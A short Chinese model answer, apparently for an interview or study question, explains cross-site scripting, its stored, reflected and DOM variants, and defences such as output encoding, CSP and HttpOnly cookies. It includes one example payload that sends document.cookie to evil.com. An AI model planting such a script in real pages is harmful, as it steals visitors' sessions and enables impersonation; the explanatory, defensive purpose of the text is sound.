# XSS 攻击

> 标准答案（约 200 字）

XSS 是 Cross-Site Scripting 的缩写，跨站脚本攻击——黑客在网页里塞恶意 JavaScript，访问者的浏览器就会执行这段代码。常见场景：评论框没过滤，用户发一段 `<script>document.location='evil.com?c='+document.cookie</script>`，别人一看评论，cookie 就被偷走。偷到 cookie 黑客就能冒充你登录。还有"存储型"（留言入库后每次都被执行）、"反射型"（诱导点链接）、"DOM 型"（前端漏洞）三类。防范方法：输入过滤、输出编码、CSP 头、HttpOnly cookie。OWASP 也长期把 XSS 列入头部风险。它提醒每个写前端的人：互联网是开放的，但开放是有代价的。今天我想说，每一次"安全过滤"，都是在帮用户挡住一次可能的伤害；少一行风险代码，就多一份安心。
